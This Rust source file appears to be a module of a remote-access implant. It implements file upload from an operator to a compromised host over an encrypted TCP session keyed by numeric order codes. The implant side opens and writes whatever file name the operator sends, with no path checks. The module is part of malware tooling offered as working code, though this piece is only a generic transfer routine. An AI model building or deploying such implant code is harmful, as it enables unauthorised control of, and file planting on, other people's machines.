use std::*;
use std::fs::{ File, OpenOptions };
use communication::*;
use byteorder::{ByteOrder, LittleEndian};
use std::io::{Write, Read};

pub fn client_run(local_file: &mut File, implant_session: &mut encrypted_tcp::EncryptedSession, remote_file: &str) -> () {
    LittleEndian::write_u32(&mut implant_session.tcp_session.orders, 1003);
    implant_session.send_orders();
    implant_session.tcp_session.output_buffer.write(&remote_file.as_bytes()).unwrap();
    implant_session.send(); //Send the file name and wait to see if the remote side can create the file.
    match implant_session.get_orders() {
        9999 => {
            local_file.read_to_end(&mut implant_session.tcp_session.output_buffer).unwrap();
            implant_session.send();
        },
        9998 => {
            implant_session.recv();
            io::stdout().write(str::from_utf8(&implant_session.tcp_session.input_buffer)
                               .unwrap()
                               .as_bytes())
                .unwrap();
            io::stdout()
                .flush()
                .unwrap();
        },
        _ => panic!("Failed when attempting to upload file"),
    }
}

pub fn server_run(implant_session: &mut encrypted_tcp::EncryptedSession) -> Result<File, io::Error> {
    implant_session.recv(); //Receive name of file to create
    let file_name = str::from_utf8(&implant_session.tcp_session.input_buffer).unwrap();
    let to_create = try!(OpenOptions::new().write(true).create(true).open(file_name));
    Ok(to_create)
}
